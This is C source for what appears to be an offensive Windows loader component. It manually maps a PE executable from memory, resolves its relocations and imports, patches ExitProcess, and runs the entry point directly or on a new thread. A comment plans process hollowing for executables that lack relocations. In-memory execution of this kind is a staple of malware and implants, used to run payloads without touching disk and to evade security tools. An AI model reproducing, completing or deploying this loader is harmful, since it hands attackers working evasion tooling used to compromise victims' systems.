#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/loader/loader.h"


#ifdef LOAD_AND_LISTEN
static VOID CALLBACK MemRunCallback(PVOID param, BOOLEAN timedOut) {
    LdrMemContext *ctx = (LdrMemContext *)param;
    PVOID Base = ctx->BaseAddress;

    PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(Base)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->VirtualAddress) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, Base, importDir->VirtualAddress);
        for (; pImport->Name; pImport++) {
            PCHAR name = RVA2VA(PCHAR, Base, pImport->Name);
            HMODULE hMod = ldr->win32->LoadLibraryA(name);  
            ldr->win32->FreeLibrary(hMod);                 
            ldr->win32->FreeLibrary(hMod);                   
        }
    }

    SIZE_T size = 0;
    ldr->win32->NtFreeVirtualMemory(CurrentProcess(), &ctx->BaseAddress, &size, MEM_RELEASE);
    ldr->win32->LocalFree(ctx);
    DBGA("[*] Cleaned up memory!\n");
}
#endif

BOOL LdrMapExe(LdrTask info) {
	DBGA("[+] Mapping exe into memory\n");
	
	PIMAGE_OPTIONAL_HEADER pOpt = OPT_HEADER(info.Data);
	PIMAGE_SECTION_HEADER sec   = SECTION_HEADER(info.Data);
	WORD numSections            = FILE_HEADER(info.Data)->NumberOfSections;

	SIZE_T TotalSize  = pOpt->SizeOfImage;
	PVOID BaseAddress = NULL;
	DBGA("[+] Calling NtAllocate\n");
	if(!NT_SUCCESS(ldr->win32->NtAllocateVirtualMemory(CurrentProcess(), &BaseAddress, 0, &TotalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		DBGA("[*] NtAllocate Failed\n");
		return FALSE;
	}
	if (!BaseAddress) {
		DBGA("[*] BaseAddress NULL\n");

		return FALSE;
	}

	LdrMemcpy(BaseAddress, info.Data, pOpt->SizeOfHeaders);
	LdrCopySections(BaseAddress, info.Data, sec, numSections);
	LdrProcessRelocs(BaseAddress, info.Data);
	LdrProcessIAT(BaseAddress, info.Data);
#ifdef LOAD_AND_LISTEN
	LdrPatchExitProcess();
#endif
	LdrSetSectionPerms(BaseAddress, sec, numSections);

	ULONG_PTR entry = (ULONG_PTR)BaseAddress + pOpt->AddressOfEntryPoint;
	
#ifdef LOAD_AND_EXIT
	DBGA("[*] Jumping to main\n");
	((void(*)())entry)();
#else
	DBGA("[*] Starting Thread\n");
	LdrMemContext* Addr = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(LdrMemContext));
	Addr->BaseAddress = BaseAddress;

	HANDLE hThread = ldr->win32->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry, NULL,0, NULL);
	HANDLE hWaitObject = NULL;
	ldr->win32->RegisterWaitForSingleObject(
	    &hWaitObject,
	    hThread,
	    MemRunCallback,
	    Addr,
	    INFINITE,            
	    WT_EXECUTEONLYONCE
	);
#endif

	return TRUE;
}

BOOL LdrRunExe(LdrTask info) {
	if (HasReloc(info.Data)) {
		return LdrMapExe(info);
	}
	// TODO: LdrHollowProcess for EXEs without .reloc
	return FALSE;
}
